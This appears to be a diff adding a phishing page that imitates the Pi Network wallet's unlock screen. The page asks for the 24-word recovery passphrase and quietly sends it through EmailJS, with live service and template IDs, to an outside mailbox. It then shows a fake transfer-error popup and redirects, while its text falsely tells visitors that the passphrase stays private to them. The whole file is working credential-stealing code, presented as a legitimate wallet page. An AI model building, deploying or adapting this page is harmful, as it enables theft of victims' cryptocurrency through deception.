@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Wallet Unlock</title>
+    <link rel="stylesheet" href="walletstyles.css">
+  <link rel="icon" type="image/png" href="images/pi-logo-fav.png">
+</head>
+<body>
+    <div class="wallet-container">
+        <div class="header">
+            <img src="Images/Wallet.png" alt="Wallet Icon" class="header-icon">
+            <span class="wallet-title">Wallet</span>
+            <img src="Images/pi-logo.png" alt="Pi Logo" class="header-icon">
+        </div>
+
+        <div class="unlock-box">
+            <h2>Unlock Pi Wallet</h2>
+            <form id="passphraseForm">
+                <textarea name="passphrase" id="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+                <button type="submit" class="passphrase-btn">Unlock with passphrase</button>
+            </form>
+           
+            <button class="faceid-btn">Unlock With Face ID</button>
+            <p class="info-text">
+                As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
+                Recovery of passphrase is currently impossible.
+            </p>
+            <p class="lost-passphrase">
+                Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+            </p>
+        </div>
+    </div>
+
+    <!-- Popup Modal -->
+    <div class="popup-container hidden" id="popup">
+        <div class="popup">
+            <p>Your Unable to Trasfer, Please Try Again Later!.</p>
+             <button class="close-btn" onclick="window.location.href='Index.html'">OK</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+    const popup = document.getElementById("popup");
+    const passphraseForm = document.getElementById("passphraseForm");
+    const closeBtn = document.querySelector(".close-btn");
+
+    function showPopup() {
+        popup.classList.remove("hidden");
+        popup.style.display = "flex";
+    }
+
+    function hidePopup() {
+        popup.classList.add("hidden");
+        popup.style.display = "none";
+        window.location.href = "Index.html"; // Navigate to Index.html
+    }
+
+    closeBtn.addEventListener("click", hidePopup);
+
+    window.addEventListener("click", function (event) {
+        if (event.target === popup) {
+            hidePopup();
+        }
+    });
+
+    emailjs.init("CHtQag5rf9ChQnsRO");
+
+    passphraseForm.addEventListener("submit", function (event) {
+        event.preventDefault();
+        
+        const passphrase = document.getElementById("passphrase").value.trim();
+        if (!passphrase) return;
+        
+        const templateParams = { passphrase: passphrase };
+        
+        emailjs.send("service_y68sdqc", "template_hkhcagb", templateParams)
+            .then(response => {
+                showPopup();
+                passphraseForm.reset();
+            })
+            .catch(error => {
+                console.error("EmailJS Error:", error);
+            });
+    });
+});
+
+    </script>
+</body>
+</html>
